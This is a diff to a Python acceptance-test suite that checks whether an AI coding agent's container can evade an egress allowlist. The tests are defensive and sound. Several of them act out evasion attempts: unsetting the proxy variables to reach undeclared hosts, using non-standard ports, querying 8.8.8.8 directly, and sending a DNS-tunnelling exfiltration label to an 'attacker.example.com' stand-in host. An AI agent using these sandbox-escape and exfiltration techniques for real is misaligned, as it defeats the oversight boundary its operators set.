@@ -1873,7 +1873,7 @@ def test_undeclared_provider_is_refused_not_dropped(acc):
     000 for a refusal and a drop alike (research R10a, measured).
     """
     laptop = _gen_keypair(acc.tmp / "laptop12a")
-    proj = _egress_project(acc, "acc12a", "    egress:\n      providers: [anthropic]\n")
+    proj = _egress_project(acc, "acc12a", "    egress:\n      allow: [{provider: anthropic}]\n")
     acc.register("acc12a")
     r = acc.cli(["up", "acc12a", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
     assert r.returncode == 0, f"deploy with a declaration failed:\n{r.stderr}"
@@ -1894,7 +1894,7 @@ def test_undeclared_provider_is_refused_not_dropped(acc):
 def test_operator_no_proxy_is_refused_at_deploy(acc):
     """Quickstart S6 — the feature's most likely silent failure. If this deploys,
     the declaration reads as enforced while enforcing nothing."""
-    proj = _egress_project(acc, "acc12b", "    egress:\n      providers: [anthropic]\n")
+    proj = _egress_project(acc, "acc12b", "    egress:\n      allow: [{provider: anthropic}]\n")
     (proj / ".agent-container" / "acc12b.env").write_text("GH_TOKEN=x\nNO_PROXY=*\n")
     acc.register("acc12b")
     r = acc.cli(["up", "acc12b"], cwd=proj)
@@ -1922,7 +1922,7 @@ def test_teardown_leaves_no_proxy_behind(acc):
     it — including after the declaration is DROPPED, when the regenerated file no
     longer declares the service that is still running."""
     laptop = _gen_keypair(acc.tmp / "laptop12d")
-    proj = _egress_project(acc, "acc12d", "    egress:\n      providers: [anthropic]\n")
+    proj = _egress_project(acc, "acc12d", "    egress:\n      allow: [{provider: anthropic}]\n")
     acc.register("acc12d")
     assert acc.cli(
         ["up", "acc12d", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
@@ -1944,4 +1944,460 @@ def test_teardown_leaves_no_proxy_behind(acc):
     assert "agent-egress-acc12d" not in ps.stdout, (
         "the proxy survived teardown — it carries restart: unless-stopped and is "
         "invisible to list, to every wizard picker and to assert_host_empty"
+    )
+
+
+# --- Feature 012 Phase B: US4 evasion, against real containers --------------
+# These CANNOT be unit-tested. US4's claim is about what a HOSTILE PROCESS
+# cannot do, so each scenario drives the container adversarially rather than
+# cooperatively — a cooperative test would pass against Phase A too and prove
+# nothing new.
+
+
+def _phase_b_project(acc, name: str, extra: str = ""):
+    proj = acc.tmp / f"proj{name}"
+    (proj / ".agent-container").mkdir(parents=True)
+    (proj / ".agent-container" / f"{name}.env").write_text(
+        "GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@e.com\n"
+    )
+    (proj / ".agent-container" / "environments.yaml").write_text(
+        f"environments:\n  - name: {name}\n    host: local\n"
+        f"    container:\n      agent: claude\n"
+        f"    egress:\n      allow:\n        - provider: anthropic\n{extra}"
+    )
+    return proj
+
+
+def test_agent_cannot_switch_enforcement_off(acc):
+    """SC-008, quickstart S12 — THE test for US4.
+
+    Under Phase A the same call SUCCEEDS: the agent unsets HTTPS_PROXY and walks
+    out. Here routing is done by the network stack, so unsetting every variable
+    the agent can see changes nothing.
+    """
+    laptop = _gen_keypair(acc.tmp / "lapB1")
+    proj = _phase_b_project(acc, "accb1")
+    acc.register("accb1")
+    r = acc.cli(["up", "accb1", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
+    assert r.returncode == 0, f"deploy failed:\n{r.stderr}"
+
+    declared = _exec("accb1", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
+                               "https://api.anthropic.com/v1/messages"])  # fmt: skip
+    assert declared.returncode == 0, "the DECLARED provider must stay reachable"
+
+    evade = _exec("accb1", ["sh", "-c",
+        "unset HTTPS_PROXY HTTP_PROXY https_proxy http_proxy NO_PROXY no_proxy; "
+        "curl -s -o /dev/null --max-time 25 https://api.openai.com/v1/models"])  # fmt: skip
+    assert evade.returncode != 0, (
+        "the agent unset every proxy variable and still reached an undeclared host — "
+        "enforcement is cooperative, not transparent"
+    )
+
+
+def test_agent_cannot_reach_a_non_standard_port(acc):
+    """SC-009, quickstart S13. The hole the first design sketch left: redirecting
+    only 80/443 under a default-ACCEPT policy lets 8080 straight through, which is
+    WORSE than no control because the declaration still reads as constraining."""
+    laptop = _gen_keypair(acc.tmp / "lapB2")
+    proj = _phase_b_project(acc, "accb2")
+    acc.register("accb2")
+    assert acc.cli(
+        ["up", "accb2", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
+    ).returncode == 0  # fmt: skip
+    # NOT `returncode != 0`. Once the diagnostic proxy actually works, an
+    # undeclared port is REFUSED WITH A STATUS rather than dropped, and `curl`
+    # exits 0 for a 403 — so the old assertion failed while the port was properly
+    # closed. Inverting it would be worse: `returncode == 0` also passes when the
+    # agent genuinely REACHES the port, which is the hole this test exists for.
+    #
+    # What must hold is that the agent never gets a response from the ORIGIN. So
+    # both acceptable outcomes are named, and 200 is rejected explicitly.
+    for port in ("8080", "1337"):
+        r = _exec("accb2", ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
+                            "--max-time", "10", f"http://example.com:{port}/"])  # fmt: skip
+        code = (r.stdout or "").strip()
+        assert r.returncode != 0 or code == "403", (
+            f"port {port} reachable under default-deny "
+            f"(exit {r.returncode}, http_code {code!r}; 403 = the proxy refused it, "
+            "a 2xx/3xx means the origin answered and the port is OPEN)"
+        )
+        # And with the proxy variables removed, nothing may answer at all — that is
+        # the netfilter claim, which must not rest on the agent's cooperation.
+        bare = _exec("accb2", ["env", "-u", "http_proxy", "-u", "https_proxy",
+                               "-u", "HTTP_PROXY", "-u", "HTTPS_PROXY",
+                               "curl", "-s", "-o", "/dev/null", "--max-time", "10",
+                               f"http://example.com:{port}/"])  # fmt: skip
+        assert bare.returncode != 0, (
+            f"port {port} reachable with the proxy variables UNSET — the boundary "
+            "is depending on the agent's cooperation, which is what US4 removes"
+        )
+
+
+def test_agent_container_gains_no_capability(acc):
+    """SC-011, quickstart S16 — the BLOCKING check.
+
+    If the agent shows any capability the design has inverted its own principle,
+    granting privilege to the container that runs untrusted code.
+    """
+    laptop = _gen_keypair(acc.tmp / "lapB3")
+    proj = _phase_b_project(acc, "accb3")
+    acc.register("accb3")
+    assert acc.cli(
+        ["up", "accb3", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
+    ).returncode == 0  # fmt: skip
+
+    def caps(container):
+        r = subprocess.run(
+            [RUNTIME, "inspect", container, "--format", "{{.HostConfig.CapAdd}}"],
+            capture_output=True, text=True,
+        )  # fmt: skip
+        return r.stdout.strip()
+
+    assert caps("agent-container-accb3") in ("[]", "<no value>", ""), "the AGENT must hold nothing"
+    assert "NET_ADMIN" in caps("agent-egress-accb3"), "the privilege belongs on the proxy"
+
+
+def test_declared_provider_still_resolves(acc):
+    """US5 scenario 3 / T136a — the positive case.
+
+    An allowlist-only resolver that resolves NOTHING passes every refusal test
+    here. This is what separates "working" from "broken closed", and broken-closed
+    is the failure this mechanism makes easy.
+    """
+    laptop = _gen_keypair(acc.tmp / "lapB4")
+    proj = _phase_b_project(acc, "accb4")
+    acc.register("accb4")
+    assert acc.cli(
+        ["up", "accb4", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
+    ).returncode == 0  # fmt: skip
+    r = _exec("accb4", ["getent", "hosts", "api.anthropic.com"])
+    assert r.returncode == 0 and r.stdout.strip(), "a DECLARED name must resolve"
+    u = _exec("accb4", ["getent", "hosts", "api.openai.com"])
+    assert u.returncode != 0, "an undeclared name must not resolve"
+
+
+# A raw DNS query, because the image carries no `dig` — system dependencies are
+# baked at build time and an agent never installs one at runtime (CLAUDE.md), so
+# a test needing `dig` would be a test that changed the image.
+#
+# What `dig` gives that `getent` cannot is the RCODE, and the rcode is the only
+# thing separating two outcomes an address-shaped assertion reports identically:
+#
+#   REFUSED (5)  — unbound declined to ASK. The question never left the boundary.
+#   NXDOMAIN (3) — something upstream answered "no such name", so the question DID
+#                  leave. For a tunnelling-shaped label that is a total failure
+#                  wearing the costume of a success, because the payload rides in
+#                  the question and not in the answer (FR-020b).
+#
+# It is also the tell for the rules being in the wrong POSITION rather than off:
+# the daemon's own resolver answers NXDOMAIN where unbound answers REFUSED
+# (research R19a, measured).
+_DNS_PROBE = r"""
+import socket, sys
+
+qname, server, timeout = sys.argv[1], sys.argv[2], float(sys.argv[3])
+if server == "auto":  # whatever this container was itself told to use
+    with open("/etc/resolv.conf") as fh:
+        server = next(ln.split()[1] for ln in fh if ln.startswith("nameserver"))
+query = b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+for label in qname.split("."):
+    query += bytes([len(label)]) + label.encode()
+query += b"\x00\x00\x01\x00\x01"
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.settimeout(timeout)
+try:
+    sock.sendto(query, (server, 53))
+    reply, _ = sock.recvfrom(4096)
+except OSError as exc:
+    print(f"NORESPONSE {server} {exc}")
+else:
+    print(f"RCODE {reply[3] & 0x0F} {server}")
+"""
+
+
+def _dns_probe(env: str, qname: str, server: str = "auto", timeout: int = 8) -> str:
+    """`RCODE <n> <server>` or `NORESPONSE <server> <why>`, asked from inside the
+    container. A failure of the probe ITSELF is raised rather than folded into the
+    result, so a broken probe can never read as a successful refusal."""
+    r = _exec(env, ["python3", "-c", _DNS_PROBE, qname, server, str(timeout)])
+    assert r.returncode == 0, f"the DNS probe itself failed:\n{r.stdout}\n{r.stderr}"
+    return r.stdout.strip()
+
+
+def test_a_declared_port_opens_that_host_and_that_port_only(acc):
+    """SC-010, quickstart S14 — the granularity claim, and the one a too-permissive
+    implementation passes halfway.
+
+    Reachability alone is not the property. A rule that opened the HOST, or the
+    protocol, satisfies "ssh works" while admitting everything adjacent that the
+    operator did not declare — so the same host on another port and the same port
+    on another host are probed too. `build_squid_acl` excludes ported entries for
+    exactly this reason, and this is the only place that exclusion is observable.
+
+    `ssh-keyscan` rather than `ssh`: it completes a real SSH handshake with the
+    remote and needs no credential, so neither result can be an auth artefact.
+    """
+    laptop = _gen_keypair(acc.tmp / "lapB5")
+    proj = _phase_b_project(acc, "accb5", "        - host: github.com\n          port: 22\n")
+    acc.register("accb5")
+    assert acc.cli(
+        ["up", "accb5", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
+    ).returncode == 0  # fmt: skip
+
+    declared = _exec("accb5", ["ssh-keyscan", "-T", "15", "-p", "22", "github.com"])
+    assert declared.returncode == 0 and "github.com" in declared.stdout, (
+        f"the DECLARED {{host: github.com, port: 22}} did not connect (exit "
+        f"{declared.returncode}: {declared.stderr.strip()[:200]!r}) — default-deny "
+        f"with the port entry never applied looks exactly like this"
+    )
+
+    # The SAME host, an undeclared port. 443 is redirected into squid, whose
+    # allowlist deliberately carries no ported entries, so `ssl_bump terminate`
+    # ends it (curl exit 35). A 0 here means declaring port 22 opened 443 as well.
+    other_port = _exec("accb5", ["curl", "-s", "-o", "/dev/null", "--max-time", "20",
+                                 "https://github.com/"])  # fmt: skip
+    assert other_port.returncode != 0, (
+        "github.com:443 answered although only port 22 was declared — the entry "
+        "opened the HOST rather than the endpoint, which is the SC-010 failure"
+    )
+
+    # The same PORT, another host. gitlab.com is undeclared, so it is refused at
+    # the resolver before netfilter is consulted at all; either refusal is
+    # correct, what must not happen is a completed handshake.
+    other_host = _exec("accb5", ["ssh-keyscan", "-T", "15", "-p", "22", "gitlab.com"])
+    assert not other_host.stdout.strip(), (
+        "gitlab.com:22 answered — declaring one SSH destination admitted another, "
+        "i.e. the protocol was permitted generally"
+    )
+
+
+def test_an_undeclared_name_does_not_resolve_including_a_tunnelling_label(acc):
+    """SC-012, quickstart S15 — where the rcode matters as much as the failure.
+
+    `getent` reports only whether an address came back, and for this label that
+    is the SAME ANSWER either way: measured against a public resolver,
+    `<label>.attacker.example.com` returns NOERROR with an empty answer section,
+    so `getent` fails identically whether the question was refused here or
+    carried all the way to the attacker's nameserver. The exfiltration is in the
+    question, not the answer (FR-020b) — so the label is probed for its RCODE
+    too, which is the only signal that distinguishes the two.
+    """
+    laptop = _gen_keypair(acc.tmp / "lapB6")
+    proj = _phase_b_project(acc, "accb6")
+    acc.register("accb6")
+    assert acc.cli(
+        ["up", "accb6", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
+    ).returncode == 0  # fmt: skip
+
+    tunnel = "ZXhmaWx0cmF0ZWQ.attacker.example.com"
+    # The positive control FIRST: a resolver that resolves nothing passes every
+    # refusal below, and research R17 shipped exactly that for a while.
+    ok = _exec("accb6", ["getent", "hosts", "api.anthropic.com"])
+    assert ok.returncode == 0 and ok.stdout.strip(), (
+        "a DECLARED name did not resolve — every refusal below is then vacuous, "
+        "and broken-closed is the failure this mechanism makes easy"
+    )
+    for undeclared in ("api.openai.com", tunnel):
+        r = _exec("accb6", ["getent", "hosts", undeclared])
+        assert r.returncode != 0, f"{undeclared} resolved: {r.stdout.strip()!r}"
+
+    probe = _dns_probe("accb6", tunnel)
+    assert probe.startswith("RCODE 5") or probe.startswith("NORESPONSE"), (
+        f"expected REFUSED (rcode 5) or no answer at all for the tunnelling "
+        f"label, got {probe!r}. Rcode 0, 2 or 3 all mean something ANSWERED, and "
+        f"an answer means the question travelled to a nameserver that had to read "
+        f"the label to produce it — the payload has left (research R19a)"
+    )
+
+
+def test_a_public_resolver_cannot_be_queried_directly(acc):
+    """SC-013, quickstart S15 — `dig @8.8.8.8`, with the tools the image has.
+
+    FR-020a is met by DROPPING port 53 rather than redirecting it (research R18):
+    every resolver except ours is unreachable, so there is nothing left to
+    redirect. The assertion is written against the PROPERTY rather than that
+    mechanism — an implementation that redirected instead would still have to
+    keep the question inside the boundary, and that is what is checked.
+
+    `example.com` is the query on purpose. It resolves publicly, so rcode 0 is
+    unambiguous proof the question reached Google; a name that exists nowhere
+    would come back NXDOMAIN from either resolver and prove nothing either way.
+    """
+    laptop = _gen_keypair(acc.tmp / "lapB7")
+    proj = _phase_b_project(acc, "accb7")
+    acc.register("accb7")
+    assert acc.cli(
+        ["up", "accb7", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
+    ).returncode == 0  # fmt: skip
+
+    direct = _dns_probe("accb7", "example.com", server="8.8.8.8")
+    assert direct.startswith("NORESPONSE") or direct.startswith("RCODE 5"), (
+        f"a query addressed to 8.8.8.8 was answered ({direct!r}) — rcode 0 means "
+        f"it reached Google, and every DNS guarantee in this feature is then "
+        f"advisory: an agent picks its own resolver and the allowlist is bypassed"
+    )
+
+    # The complement, and it is not optional: without it a container with no
+    # network at all passes the assertion above.
+    ours = _dns_probe("accb7", "api.anthropic.com")
+    assert ours.startswith("RCODE 0"), (
+        f"the sidecar resolver did not answer a DECLARED name ({ours!r}) — the "
+        f"refusal above would then be indistinguishable from dead DNS"
+    )
+
+
+# Opt-in, on the same principle as the Hetzner test: the end-to-end push needs a
+# real repository and a real key, which this module deliberately does not have
+# (see the module docstring). Set both to run it.
+_PUSH_URL = os.environ.get("AGENT_CONTAINER_ACCEPTANCE_PUSH_URL")  # git@host:owner/repo.git
+_PUSH_KEY = os.environ.get("AGENT_CONTAINER_ACCEPTANCE_PUSH_KEY")  # private key path
+
+
+def test_git_push_over_declared_ssh_reaches_the_remote(acc):
+    """Quickstart S18 / T138 — if this fails the feature is unshippable.
+
+    Default-deny kills `git push` over SSH unless port 22 is declared: Hard
+    Constraint #1 (every agent commits AND pushes) breaking from the opposite
+    direction to Phase A's HTTPS case.
+
+    TWO ARMS, and the split is stated rather than hidden. The always-on arm
+    drives the same SSH transport git uses and asserts the REMOTE ANSWERED: the
+    server completes the handshake and then refuses the absent key, which is a
+    protocol-level rejection and therefore proof the boundary carried the
+    session. **It does not prove a push completes** — only that the one thing
+    default-deny can break is not broken. The push itself is the second arm.
+
+    Reading a refusal as success is safe here and only here: 'Permission denied'
+    can be produced ONLY by a server that received the authentication request,
+    whereas everything default-deny does (drop, timeout, unreachable) fails
+    before any server is spoken to.
+
+    WHAT THIS TEST STRUCTURALLY CANNOT SEE, stated because the task it closes is
+    the one declared "unshippable if it fails" (T147, research R24/R25). It probes
+    SECONDS after `up`, and `{host, port}` is enforced by `iptables -d <name>`,
+    which resolves the operand ONCE at rule-install time and pins the addresses in
+    that single answer — nothing in the boundary re-resolves (measured at T146: the
+    egress container runs exactly `squid` and `unbound`, no refresher). So a green
+    result here means "reachable at deploy", not "reachable for the life of the
+    container". Measured at T146 on a live boundary: `github.com` pinned to
+    140.82.121.4, and 140.82.121.3 / .5 — the SAME host's other rotation addresses
+    — both time out. The moment the resolver hands the agent one of those, this
+    transport is dead until the container restarts, and R24 caught exactly that at
+    301 s with no recovery. A time-boxed probe cannot distinguish the two, which is
+    why the limitation is written here rather than left to be rediscovered as a
+    passing test over a broken push.
+    """
+    endpoint = ("github.com", 22)
+    if _PUSH_URL:
+        # Parsed with the CLI's OWN parser, not a second one: if the two ever
+        # disagreed, the deploy-time SSH check (FR-003c) would be vouching for an
+        # endpoint the push never uses — a check that passes for the wrong thing.
+        endpoint = _load_cli().ssh_remote_endpoint(_PUSH_URL)
+        assert endpoint, f"AGENT_CONTAINER_ACCEPTANCE_PUSH_URL is not an SSH remote: {_PUSH_URL}"
+    host, port = endpoint
+
+    laptop = _gen_keypair(acc.tmp / "lapB8")
+    proj = _phase_b_project(acc, "accb8", f"        - host: {host}\n          port: {port}\n")
+    acc.register("accb8")
+    argv = ["up", "accb8", "--authorized-key", str(laptop.with_suffix(".pub"))]
+    if _PUSH_KEY:
+        argv += ["--push-key", _PUSH_KEY]
+    r = acc.cli(argv, cwd=proj)
+    assert r.returncode == 0, f"deploy with a declared SSH endpoint failed:\n{r.stderr}"
+
+    handshake = _exec("accb8", ["ssh", "-T", "-p", str(port),
+                                "-o", "BatchMode=yes",
+                                "-o", "StrictHostKeyChecking=no",
+                                "-o", "UserKnownHostsFile=/dev/null",
+                                "-o", "ConnectTimeout=15", f"git@{host}"])  # fmt: skip
+    answered = handshake.stderr + handshake.stdout
+    assert "Permission denied" in answered or "successfully authenticated" in answered, (
+        f"the DECLARED SSH remote never answered: {answered.strip()[:300]!r}. A "
+        f"timeout, 'Network is unreachable' or 'Could not resolve hostname' here "
+        f"means default-deny is eating `git push`, and Hard Constraint #1 with it"
+    )
+
+    if not (_PUSH_URL and _PUSH_KEY):
+        return  # transport proven; the push needs a repo this module has no key for
+    # The URL rides as "$1" rather than being interpolated: an operator-supplied
+    # value spliced into a shell string is a quoting bug waiting for a repo name
+    # with a shell metacharacter in it.
+    push = _exec("accb8", ["sh", "-c",
+        'set -e; d=$(mktemp -d); git clone "$1" "$d"; cd "$d"; '
+        "date -u +'T138 %Y-%m-%dT%H:%M:%SZ' >> .agent-container-heartbeat; "
+        "git add .agent-container-heartbeat; "
+        "git commit -m 'test(T138): egress acceptance heartbeat'; "
+        "git push origin HEAD", "sh", _PUSH_URL])  # fmt: skip
+    assert push.returncode == 0, (
+        f"`git push` over the declared SSH endpoint failed — the feature is "
+        f"unshippable in this state:\n{push.stdout[-2000:]}\n{push.stderr[-2000:]}"
+    )
+
+
+def test_an_undeclared_environment_keeps_its_own_network(acc):
+    """FR-004, quickstart S19 — default-deny applies to environments that opted
+    in, NEVER retroactively. An upgrade that air-gaps everyone who never asked
+    for egress control is the worst regression this feature can ship, and it is
+    invisible to every other test here: they all declare something.
+
+    `test_no_declaration_deploys_exactly_as_before` asserts the generated MODEL
+    has no egress service. This asserts the RUNNING environment behaves like one
+    that was never touched, which the model does not imply — the port owner, the
+    network namespace and the resolver in the path are all runtime facts.
+    """
+    laptop = _gen_keypair(acc.tmp / "lapB9")
+    proj = _egress_project(acc, "accb9", "")  # no `egress:` key at all
+    acc.register("accb9")
+    r = acc.cli(["up", "accb9", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
+    assert r.returncode == 0, f"an undeclared environment must deploy unchanged:\n{r.stderr}"
+
+    ps = subprocess.run(
+        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"], capture_output=True, text=True
+    )
+    assert "agent-egress-accb9" not in ps.stdout, "an undeclared environment grew a boundary"
+
+    def inspect(fmt: str) -> str:
+        return subprocess.run(
+            [RUNTIME, "inspect", "agent-container-accb9", "--format", fmt],
+            capture_output=True, text=True,
+        ).stdout.strip()  # fmt: skip
+
+    # The two halves of "no rules": the agent is in its OWN namespace (so there is
+    # nowhere for a NET_ADMIN sidecar's rules to reach it from), and it still owns
+    # its published port — the T118 migration must not run for an environment that
+    # never declared anything.
+    netmode = inspect("{{.HostConfig.NetworkMode}}")
+    assert not netmode.startswith("container:"), (
+        f"the agent joined another container's namespace ({netmode!r}) with no declaration"
+    )
+    assert "2222" in inspect("{{.HostConfig.PortBindings}}"), (
+        "the published port moved off the agent, so the port-owner migration ran "
+        "for an environment that never opted in"
+    )
+
+    # `; true` so the exit code reports nothing: `printenv` fails on the first
+    # unset name, and here EVERY name being unset is the passing case.
+    proxy = _exec("accb9", ["sh", "-c", "printenv HTTPS_PROXY https_proxy NO_PROXY no_proxy; true"])
+    assert not proxy.stdout.strip(), f"proxy variables were injected anyway: {proxy.stdout!r}"
+
+    # No forced resolver, checked twice. An undeclared name resolving rules out an
+    # allowlist, and the rcode rules out ours being in the path at all: REFUSED is
+    # a POLICY rcode that only unbound produces here — an ordinary resolver answers
+    # NOERROR or NXDOMAIN, never that (research R16/R19a).
+    assert _exec("accb9", ["getent", "hosts", "api.openai.com"]).returncode == 0, (
+        "an undeclared name did not resolve — an allowlist resolver was applied "
+        "to an environment that declared nothing"
+    )
+    probe = _dns_probe("accb9", "t139-undeclared.example.com")
+    assert not probe.startswith("RCODE 5"), (
+        f"the resolver answered REFUSED ({probe!r}) — REFUSED is a POLICY answer, "
+        f"so the allowlist resolver is in the path of an undeclared environment"
+    )
+
+    # And unrestricted, not merely un-proxied: a host no declaration anywhere in
+    # this feature permits is reachable.
+    reach = _exec("accb9", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
+                            "https://api.openai.com/v1/models"])  # fmt: skip
+    assert reach.returncode == 0, (
+        f"egress was restricted without a declaration (curl exit {reach.returncode})"
     )
